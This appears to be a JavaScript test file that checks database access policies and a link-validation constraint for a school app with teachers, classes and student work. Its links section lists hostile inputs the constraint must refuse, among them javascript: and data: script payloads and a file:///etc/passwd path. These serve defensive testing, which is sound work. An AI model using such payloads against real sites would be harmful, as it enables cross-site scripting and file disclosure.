  const mem = await as(TEA, `UPDATE public.student_work SET member_student_ids = $2::uuid[], is_teamwork = true WHERE id = $1`, [seed.workByTeb, [A1, B1]]);
  ok("nor add a class-B child as a team member (the work would appear on that child's page)", mem.err !== null, `allowed (${mem.n})`);
  ok("it can re-point it at another child of class A", allowed(await as(TEA, `UPDATE public.student_work SET student_id = $2 WHERE id = $1`, [seed.workByTeb, A2])));
  const rp = await as(TEA, `UPDATE public.student_reports SET student_id = $2 WHERE id = $1`, [seed.reportGone, B1]);
  ok("teacher A cannot re-point a class-A report at a class-B child", rp.err !== null, `allowed (${rp.n})`);
  const blind = await as(TEB, `UPDATE public.student_error_log SET class_id = '${CA}'`);
  ok("a column-free UPDATE cannot move teacher B's rows into class A (WITH CHECK holds alone)", blind.err !== null || blind.n === 0, `allowed (${blind.n})`);
}
{
  // Never wider.
  const AFTER = await visibleAll();
  const wider = [];
  for (const who of Object.keys(PEOPLE)) for (const t of Object.keys(BEFORE[who])) {
    const known = new Set(BEFORE[who][t]);
    // rows created since BEFORE by staff/admin in the flows above are not "wider": compare only ids that existed then.
    const existed = new Set(Object.values(BEFORE).flatMap((v) => v[t]));
    for (const id of AFTER[who][t]) if (existed.has(id) && !known.has(id)) wider.push(`${who}/${t}`);
  }
  eq("no login can read a row it could not read before", wider, []);
  eq("the child's reads are unchanged: A1's login still reads its approved work, published report, CEFR points and error log",
    Object.fromEntries(["student_work", "student_reports", "cefr_assessments", "student_error_log"].map((t) => [t, BEFORE.KID[t].every((id) => AFTER.KID[t].includes(id) || id === seed.workA)])),
    { student_work: true, student_reports: true, cefr_assessments: true, student_error_log: true });
  eq("the family's read of its child's CEFR points is unchanged", BEFORE.PARENT.cefr_assessments.every((id) => AFTER.PARENT.cefr_assessments.includes(id)), true);
}

console.log("=== after: resources ===");
{
  ok("teacher A adds a resource", allowed(await as(TEA, `INSERT INTO public.resources (title, uploaded_by, external_url, visibility) VALUES ('Song', $1, 'https://example.org/song', 'shared') RETURNING id`, [TEA])));
  ok("teacher A edits and deletes its own", allowed(await as(TEA, `UPDATE public.resources SET title = 'Phonics 2' WHERE id = $1`, [seed.resTea])) && allowed(await as(TEA, `DELETE FROM public.resources WHERE id = $1`, [seed.resTea])));
  const give = await as(TEA, `UPDATE public.resources SET uploaded_by = $2 WHERE id = $1`, [seed.resTea, TEB]);
  ok("it cannot hand its resource to someone else (there was no WITH CHECK before)", give.err !== null, `allowed (${give.n})`);
  eq("teacher B cannot edit or delete teacher A's resource", [(await as(TEB, `UPDATE public.resources SET title = 'x' WHERE id = $1`, [seed.resTea])).n, (await as(TEB, `DELETE FROM public.resources WHERE id = $1`, [seed.resTea])).n], [0, 0]);
  ok("teacher B cannot add one in teacher A's name", !allowed(await as(TEB, `INSERT INTO public.resources (title, uploaded_by) VALUES ('x', $1)`, [TEA])));
  ok("a self-made teacher (role, no record) can still add a resource of its own - closed by F-01, not here", allowed(await as(FAKE_T, `INSERT INTO public.resources (title, uploaded_by) VALUES ('x', $1)`, [FAKE_T])));
  ok("an admin edits anyone's", allowed(await as(ADMIN, `UPDATE public.resources SET title = 'y' WHERE id = $1`, [seed.resTea])));
}

console.log("=== after: links ===");
{
  const tryWork = (url, who = TEA) => as(who, `INSERT INTO public.student_work (uploaded_by, class_id, student_id, status, external_url) VALUES ($1,$2,$3,'needs_review',$4)`, [who, CA, A1, url]);
  const tryRes = (col, url) => as(ADMIN, `INSERT INTO public.resources (title, uploaded_by, ${col}) VALUES ('r', $1, $2)`, [ADMIN, url]);
  for (const url of ["https://docs.google.com/document/d/1AbC/edit?usp=sharing#heading=h.1", "http://example.org/a", "HTTPS://Example.ORG/Path", "https://vi.wikipedia.org/wiki/Ti%E1%BA%BFng_Vi%E1%BB%87t"]) {
    ok(`accepted: ${url}`, allowed(await tryWork(url)) && allowed(await tryRes("external_url", url)) && allowed(await tryRes("thumbnail_url", url)));
  }
  for (const url of ["javascript:alert(1)", "JavaScript:alert(1)", " javascript:alert(1)", "java\nscript:alert(1)", "data:text/html,<script>alert(1)</script>", "vbscript:msgbox(1)",
    "file:///etc/passwd", "//evil.example/x", "evil.example/x", "https://", "https://a b.example/x", "https://example.org/a\nb", "https://example.org/\u0000", "", " https://example.org/a", "ftp://example.org/a"]) {
    const w = await tryWork(url), r = await tryRes("external_url", url), t = await tryRes("thumbnail_url", url);
    ok(`refused: ${JSON.stringify(url)} (work link, resource link, thumbnail)`, w.err !== null && r.err !== null && t.err !== null, `${w.err ? "" : "work "}${r.err ? "" : "resource "}${t.err ? "" : "thumbnail"}accepted`);
  }
  let svc = null; try { await q(`INSERT INTO public.student_work (uploaded_by, class_id, status, external_url) VALUES ($1,$2,'approved','javascript:x')`, [TEA, CA]); } catch (e) { svc = e.message; }
  ok("refused for the service role and admins too (a CHECK, not a policy)", svc !== null && /student_work_external_url_http/.test(svc), svc ?? "allowed");
  ok("no link at all (NULL) is fine", allowed(await tryWork(null)));
  eq("the bad link planted before the fix is still there (NOT VALID: the paste did not fail on it)", (await one(`SELECT count(*)::int n FROM public.student_work WHERE id = $1`, [badLink])).n, 1);
  let upd = null; try { await q(`UPDATE public.student_work SET status = 'rejected' WHERE id = $1`, [badLink]); } catch (e) { upd = e.message; }
  ok("  ...but it cannot be updated until the link is fixed or cleared (production has no such row: 41 links, all http(s))", upd !== null, "allowed");
  ok("  ...clearing the link is allowed", (await as(TEA, `UPDATE public.student_work SET external_url = NULL WHERE id = $1`, [badLink])).err === null);
  // The browser's own rule, src/lib/safeUrl.ts, must refuse what the constraint refuses.
  const src = readFileSync(new URL("../../src/lib/safeUrl.ts", import.meta.url), "utf8");
  ok("src/lib/safeUrl.ts carries the same rule", /\^https\?:\\\/\\\/\[\^\\s\\u0000-\\u001f\\u007f\]\+\$\/i/.test(src) && /protocol === "http:" \|\| parsed\.protocol === "https:"/.test(src));
  const used = ["src/components/student/MyWorkGallery.tsx", "src/pages/StudentLessonDetail.tsx", "src/pages/TeacherSmartUpload.tsx", "src/components/resources/ResourceCard.tsx", "src/pages/TeacherResources.tsx"]
    .filter((f) => { const t = readFileSync(new URL(`../../${f}`, import.meta.url), "utf8"); return /safeHttpUrl\(|openHttpUrl\(/.test(t) && !/href=\{w\.external_url\}|window\.open\(resource\.external_url/.test(t); });
  eq("and every place that renders a stored link goes through it", used.length, 5);
}

console.log("=== a creator-owned policy this file does not know stops the install ===");
{
  await db.exec(`CREATE POLICY "anyone may add their own" ON public.cefr_assessments FOR INSERT TO authenticated WITH CHECK (created_by = auth.uid())`);
  let g = null; try { await db.exec(fixText); } catch (x) { g = x.message; }
  await db.exec("ROLLBACK").catch(() => {});
  ok("the fix refuses, naming it", g !== null && /anyone may add their own/.test(g), g ?? "installed");
  await db.exec(`DROP POLICY "anyone may add their own" ON public.cefr_assessments`);
  eq("and nothing changed", await pols(), P1);
}

console.log("=== the rollback file ===");
{
  let e = null; try { await db.exec(LIVE); } catch (x) { e = x.message; }
  ok("docs/evidence/S1-F21-rollback.sql runs after the fix", e === null, e ?? "");
  eq("the policies are byte-for-byte the starting state", await pols(), P0);
  eq("helpers and constraints are gone", [(await one(`SELECT count(*)::int n FROM pg_proc WHERE proname LIKE 'staff_%'`)).n, (await cons()).length], [0, 0]);
  eq("and the old behaviour is back (a new account plants all five)", await forgeAll(NEW, B1, CB), FIVE);
  let e2 = null; try { await db.exec(LIVE); } catch (x) { e2 = x.message; }
  ok("it can be pasted twice", e2 === null, e2 ?? "");
  let e3 = null; try { await db.exec(fixText); } catch (x) { e3 = x.message; }
  ok("and the fix pastes again over the rolled-back state", e3 === null, e3 ?? "");
  eq("closing it again", await forgeAll(NEW, B1, CB), []);
}

console.log(`${pass} passed, ${fail} failed`);
process.exit(fail ? 1 : 0);
